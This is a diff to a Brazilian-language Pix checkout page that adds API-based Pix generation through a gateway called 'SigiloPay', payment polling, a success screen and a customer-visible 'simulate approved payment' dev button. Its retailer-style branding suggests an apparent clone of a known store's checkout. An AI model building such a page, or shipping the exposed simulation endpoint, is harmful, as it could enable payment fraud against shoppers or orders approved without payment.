@@ -591,6 +591,142 @@
       margin-top: 6px;
     }
 
+    /* BUTTON LOADING & SPINNER */
+    .btn-checkout:disabled {
+      opacity: 0.75;
+      cursor: not-allowed;
+      transform: none !important;
+      box-shadow: none !important;
+    }
+
+    .btn-spinner {
+      display: inline-block;
+      width: 16px;
+      height: 16px;
+      border: 2px solid rgba(255, 255, 255, 0.4);
+      border-top-color: #ffffff;
+      border-radius: 50%;
+      animation: spin 0.6s linear infinite;
+    }
+
+    /* ERROR ALERT */
+    .checkout-alert-error {
+      background: #fff5f5;
+      border: 1px solid #fed7d7;
+      color: #c53030;
+      border-radius: var(--radius-sm);
+      padding: 12px 14px;
+      margin-top: 14px;
+      font-size: 13px;
+      display: none;
+      align-items: center;
+      gap: 10px;
+      line-height: 1.4;
+    }
+
+    .checkout-alert-error.visible {
+      display: flex;
+    }
+
+    .checkout-alert-error svg {
+      width: 20px;
+      height: 20px;
+      fill: #e53e3e;
+      flex-shrink: 0;
+    }
+
+    /* STEP 3 SUCCESS SCREEN */
+    .payment-success-card {
+      text-align: center;
+      padding: 16px 8px;
+    }
+
+    .payment-success__icon-wrap {
+      width: 68px;
+      height: 68px;
+      background: #eafaf1;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin: 0 auto 16px;
+      border: 2px solid var(--ns-green);
+      animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    }
+
+    @keyframes popIn {
+      0% { transform: scale(0.4); opacity: 0; }
+      100% { transform: scale(1); opacity: 1; }
+    }
+
+    .payment-success__title {
+      font-size: 22px;
+      font-weight: 700;
+      color: var(--ns-green-dark);
+      margin-bottom: 6px;
+    }
+
+    .payment-success__subtitle {
+      font-size: 14px;
+      color: var(--ns-text-subtle);
+      max-width: 440px;
+      margin: 0 auto 20px;
+      line-height: 1.5;
+    }
+
+    .payment-success__details {
+      background: #fbfbfd;
+      border: 1px solid var(--ns-border);
+      border-radius: var(--radius-md);
+      padding: 18px;
+      text-align: left;
+      margin-bottom: 20px;
+      font-size: 13px;
+      line-height: 1.6;
+    }
+
+    .payment-success__row {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 8px;
+    }
+
+    .payment-success__row:last-child {
+      margin-bottom: 0;
+    }
+
+    .step-card.payment-approved {
+      border-color: rgba(36, 180, 98, 0.4);
+      box-shadow: 0 4px 18px rgba(36, 180, 98, 0.1);
+    }
+
+    .step-card.payment-approved .step-card__num {
+      background: var(--ns-green);
+      color: #ffffff;
+    }
+
+    /* DEV HELPER BUTTON */
+    .dev-simulate-btn {
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+      margin-top: 18px;
+      font-size: 11px;
+      color: var(--ns-purple);
+      background: var(--ns-purple-light);
+      border: 1px dashed var(--ns-purple-border);
+      padding: 6px 14px;
+      border-radius: 20px;
+      cursor: pointer;
+      font-weight: 600;
+      transition: all 0.2s;
+      font-family: inherit;
+    }
+
+    .dev-simulate-btn:hover {
+      background: #ebd8ff;
+    }
+
     /* RIGHT COLUMN: ORDER SUMMARY */
     .order-summary {
       background: var(--ns-card);
@@ -996,7 +1132,15 @@
               <span class="shipping-method__badge">Grátis</span>
             </div>
 
-            <button type="submit" class="btn-checkout" id="btn-to-step-3">Ir para pagamento</button>
+            <!-- Error Banner -->
+            <div class="checkout-alert-error" id="checkout-error-step2">
+              <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+              <span id="checkout-error-step2-text">Não foi possível gerar a cobrança Pix.</span>
+            </div>
+
+            <button type="submit" class="btn-checkout" id="btn-to-step-3">
+              <span id="btn-to-step-3-text">Ir para pagamento</span>
+            </button>
           </form>
         </section>
 
@@ -1005,10 +1149,11 @@
           <div class="step-card__header">
             <div class="step-card__title-wrap">
               <span class="step-card__num" id="badge-step-3">3</span>
-              <span class="step-card__title">Pagamento</span>
+              <span class="step-card__title" id="step-3-title">Pagamento</span>
             </div>
           </div>
 
+          <!-- PENDING PAYMENT VIEW -->
           <div class="step-card__body payment-pix-card" id="form-step-3" style="display:none;">
             <h2 class="payment-pix__title">Escaneie para pagar</h2>
             <p class="payment-pix__subtitle">Abra o app do seu banco e escaneie o QR code, ou use o Pix Copia e Cola.</p>
@@ -1018,7 +1163,7 @@
             </div>
 
             <div class="payment-pix__copy-wrap">
-              <input type="text" id="pix-copy-input" class="payment-pix__copy-input" readonly value="00020101021226900014br.gov.bcb.pix2568qrcode.netshoes.com.br/pix/v2/cob/c5e9a4f210d742b89a812e947d15204000053039865406287.905802BR5916NETSHOES BRASIL6009SAO PAULO62070503***6304E8A2">
+              <input type="text" id="pix-copy-input" class="payment-pix__copy-input" readonly value="">
               <button type="button" class="payment-pix__copy-btn" id="btn-copy-pix">
                 <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"/></svg>
                 <span id="copy-btn-text">Copiar</span>
@@ -1027,12 +1172,64 @@
 
             <div class="payment-pix__status">
               <div class="payment-pix__pulse"></div>
-              <span>Aguardando confirmação do pagamento...</span>
+              <span id="pix-status-text">Aguardando confirmação do pagamento...</span>
             </div>
 
             <div class="payment-pix__timer" id="pix-timer">
-              Código Pix expira em: <strong id="timer-display">14:59</strong>
+              Código Pix expira em: <strong id="timer-display">15:00</strong>
             </div>
+
+            <div style="margin-top: 14px;">
+              <button type="button" class="dev-simulate-btn" id="btn-dev-simulate" title="Para testar aprovação instantaneamente sem transferir dinheiro real">
+                🧪 Simular Pagamento Aprovado (Dev)
+              </button>
+            </div>
+          </div>
+
+          <!-- SUCCESS VIEW (WHEN PAID) -->
+          <div class="step-card__body payment-success-card" id="success-step-3" style="display:none;">
+            <div class="payment-success__icon-wrap">
+              <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#24b462" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+                <polyline points="20 6 9 17 4 12"></polyline>
+              </svg>
+            </div>
+            <h2 class="payment-success__title">Pagamento Confirmado!</h2>
+            <p class="payment-success__subtitle">Seu pedido foi aprovado com sucesso via Pix e já está em processo de separação e envio.</p>
+
+            <div class="payment-success__details">
+              <div class="payment-success__row">
+                <span style="color: var(--ns-text-muted);">Identificador do pedido:</span>
+                <strong id="success-order-id">#</strong>
+              </div>
+              <div class="payment-success__row">
+                <span style="color: var(--ns-text-muted);">Forma de pagamento:</span>
+                <strong>Pix (SigiloPay Instantâneo)</strong>
+              </div>
+              <div class="payment-success__row">
+                <span style="color: var(--ns-text-muted);">Valor pago:</span>
+                <strong style="color: var(--ns-text-dark);">R$ 287,90</strong>
+              </div>
+              <div class="payment-success__row">
+                <span style="color: var(--ns-text-muted);">Status:</span>
+                <strong style="color: var(--ns-green-dark);">Aprovado ✓</strong>
+              </div>
+              <div class="payment-success__row">
+                <span style="color: var(--ns-text-muted);">Previsão de entrega:</span>
+                <strong style="color: var(--ns-green-dark);">2 a 5 dias úteis</strong>
+              </div>
+              <div style="margin-top: 10px; padding-top: 10px; border-top: 1px dashed var(--ns-border);">
+                <div style="color: var(--ns-text-muted); font-size: 12px; margin-bottom: 3px;">Endereço de entrega:</div>
+                <div id="success-shipping-address" style="font-weight: 500;"></div>
+              </div>
+            </div>
+
+            <div style="background: var(--ns-purple-light); border-radius: var(--radius-sm); padding: 12px 14px; font-size: 13px; color: var(--ns-purple-dark); margin-bottom: 20px;">
+              Enviamos a confirmação e o código de rastreamento para seu WhatsApp e e-mail.
+            </div>
+
+            <a href="index.html" class="btn-checkout" style="text-decoration: none; justify-content: center;">
+              Voltar para o produto
+            </a>
           </div>
         </section>
 
@@ -1274,9 +1471,6 @@
 
           card3.className = 'step-card active';
           form3.style.display = 'block';
-
-          renderQrCode();
-          startPixTimer();
         }
 
         window.scrollTo({ top: 0, behavior: 'smooth' });
@@ -1338,8 +1532,14 @@
         goToStep(2);
       });
 
-      // FORM 2 SUBMIT
-      form2.addEventListener('submit', function (e) {
+      // ORDER & PIX STATE
+      var currentIdentifier = null;
+      var currentTransactionId = null;
+      var statusPollInterval = null;
+      var pixTimerInterval = null;
+
+      // FORM 2 SUBMIT (GENERATE REAL PIX VIA API)
+      form2.addEventListener('submit', async function (e) {
         e.preventDefault();
         var cep = document.getElementById('ship-cep').value.trim();
         var address = document.getElementById('ship-address').value.trim();
@@ -1403,7 +1603,63 @@
           city: city,
           uf: uf
         };
-        goToStep(3);
+
+        var errorAlert = document.getElementById('checkout-error-step2');
+        var errorText = document.getElementById('checkout-error-step2-text');
+        var submitBtn = document.getElementById('btn-to-step-3');
+        var submitBtnText = document.getElementById('btn-to-step-3-text');
+
+        errorAlert.classList.remove('visible');
+        submitBtn.disabled = true;
+        submitBtnText.innerHTML = '<span class="btn-spinner"></span> Gerando cobrança Pix...';
+
+        try {
+          var response = await fetch('/api/create-pix', {
+            method: 'POST',
+            headers: {
+              'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+              client: clientData,
+              shipping: shippingData,
+              size: size,
+              amount: 287.90
+            })
+          });
+
+          var data = await response.json();
+
+          if (!response.ok || !data.success) {
+            throw new Error(data.error || 'Erro ao gerar o Pix pela SigiloPay.');
+          }
+
+          currentIdentifier = data.identifier;
+          currentTransactionId = data.transactionId;
+
+          // Populate copy input
+          var pixPayload = data.pix && data.pix.code ? data.pix.code : '';
+          document.getElementById('pix-copy-input').value = pixPayload;
+
+          // Transition to Step 3
+          goToStep(3);
+
+          // Render QR Code
+          renderQrCode(pixPayload);
+
+          // Start Timer with expiration date if provided
+          startPixTimer(data.pix && data.pix.expiresAt ? data.pix.expiresAt : null);
+
+          // Start polling order status
+          startStatusPolling(currentIdentifier);
+
+        } catch (err) {
+          console.error('[Checkout] Erro na criação do Pix:', err);
+          errorText.textContent = err.message || 'Falha ao conectar com o serviço de pagamento. Tente novamente.';
+          errorAlert.classList.add('visible');
+        } finally {
+          submitBtn.disabled = false;
+          submitBtnText.textContent = 'Ir para pagamento';
+        }
       });
 
       // EDIT BUTTONS
@@ -1411,23 +1667,25 @@
       editBtn2.addEventListener('click', function () { goToStep(2); });
 
       // STEP 3: QR CODE & COPY PIX
-      var qrRendered = false;
-      function renderQrCode() {
-        if (qrRendered) return;
+      function renderQrCode(pixPayload) {
         var container = document.getElementById('pix-qrcode');
         container.innerHTML = '';
-        var pixPayload = document.getElementById('pix-copy-input').value;
+        var payload = pixPayload || document.getElementById('pix-copy-input').value;
+
+        if (!payload) {
+          container.innerHTML = '<span style="color:#888; font-size:12px;">Carregando QR Code...</span>';
+          return;
+        }
 
         if (window.QRCode) {
           new QRCode(container, {
-            text: pixPayload,
+            text: payload,
             width: 210,
             height: 210,
             colorDark: '#000000',
             colorLight: '#ffffff',
             correctLevel: QRCode.CorrectLevel.M
           });
-          qrRendered = true;
         }
       }
 
@@ -1465,24 +1723,112 @@
       }
 
       // PIX EXPIRATION TIMER
-      var timerStarted = false;
-      function startPixTimer() {
-        if (timerStarted) return;
-        timerStarted = true;
-        var duration = 15 * 60;
+      function startPixTimer(expiresAt) {
+        if (pixTimerInterval) clearInterval(pixTimerInterval);
+
+        var duration = 15 * 60; // 15 mins default
+        if (expiresAt) {
+          var expTime = new Date(expiresAt).getTime();
+          var now = Date.now();
+          if (expTime > now) {
+            duration = Math.floor((expTime - now) / 1000);
+          }
+        }
+
         var timerDisplay = document.getElementById('timer-display');
 
-        var interval = setInterval(function () {
+        pixTimerInterval = setInterval(function () {
           duration--;
           if (duration <= 0) {
-            clearInterval(interval);
+            clearInterval(pixTimerInterval);
             timerDisplay.textContent = 'Expirado';
+            document.getElementById('pix-status-text').textContent = 'Código Pix expirado. Recarregue a página para gerar um novo.';
             return;
           }
           var m = Math.floor(duration / 60);
           var s = duration % 60;
           timerDisplay.textContent = (m < 10 ? '0' : '') + m + ':' + (s < 10 ? '0' : '') + s;
         }, 1000);
+      }
+
+      // STATUS POLLING
+      function startStatusPolling(identifier) {
+        if (statusPollInterval) clearInterval(statusPollInterval);
+
+        statusPollInterval = setInterval(async function () {
+          if (!currentIdentifier) return;
+          try {
+            var res = await fetch('/api/check-status?identifier=' + encodeURIComponent(identifier));
+            if (!res.ok) return;
+            var data = await res.json();
+
+            if (data && (data.paid || data.status === 'PAID')) {
+              clearInterval(statusPollInterval);
+              statusPollInterval = null;
+              onPaymentApproved(data);
+            }
+          } catch (e) {
+            console.warn('[Checkout] Erro ao verificar status do pagamento:', e);
+          }
+        }, 3000);
+      }
+
+      // PAYMENT APPROVED UI TRANSITION
+      function onPaymentApproved(orderData) {
+        if (pixTimerInterval) clearInterval(pixTimerInterval);
+
+        document.getElementById('form-step-3').style.display = 'none';
+        var successEl = document.getElementById('success-step-3');
+        successEl.style.display = 'block';
+
+        document.getElementById('step-3-title').textContent = 'Pagamento Confirmado';
+        document.getElementById('badge-step-3').textContent = '✓';
+        document.getElementById('card-step-3').classList.add('payment-approved');
+
+        var displayId = orderData.identifier || currentIdentifier || 'CV-' + Math.floor(Math.random() * 899999 + 100000);
+        document.getElementById('success-order-id').textContent = '#' + displayId;
+
+        document.getElementById('success-shipping-address').textContent =
+          (shippingData.address || '') + ', ' + (shippingData.number || '') +
+          (shippingData.complement ? ' (' + shippingData.complement + ')' : '') + ' - ' +
+          (shippingData.neighborhood || '') + ', ' + (shippingData.city || '') + '/' + (shippingData.uf || '') +
+          ' - CEP ' + (shippingData.cep || '');
+
+        if (navigator.vibrate) {
+          try { navigator.vibrate([100, 50, 100]); } catch (v) {}
+        }
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+      }
+
+      // DEV SIMULATE PAYMENT BUTTON
+      var devSimulateBtn = document.getElementById('btn-dev-simulate');
+      if (devSimulateBtn) {
+        devSimulateBtn.addEventListener('click', async function () {
+          if (!currentIdentifier) {
+            alert('Gere primeiro o código Pix clicando em "Ir para pagamento".');
+            return;
+          }
+          devSimulateBtn.disabled = true;
+          devSimulateBtn.textContent = 'Simulando aprovação...';
+          try {
+            var res = await fetch('/api/simulate-payment', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ identifier: currentIdentifier })
+            });
+            var data = await res.json();
+            if (data.success) {
+              onPaymentApproved({ identifier: currentIdentifier });
+            } else {
+              alert('Erro ao simular: ' + (data.error || 'Desconhecido'));
+            }
+          } catch (err) {
+            alert('Erro ao conectar com API de simulação: ' + err.message);
+          } finally {
+            devSimulateBtn.disabled = false;
+            devSimulateBtn.textContent = '🧪 Simular Pagamento Aprovado (Dev)';
+          }
+        });
       }
     })();
   </script>
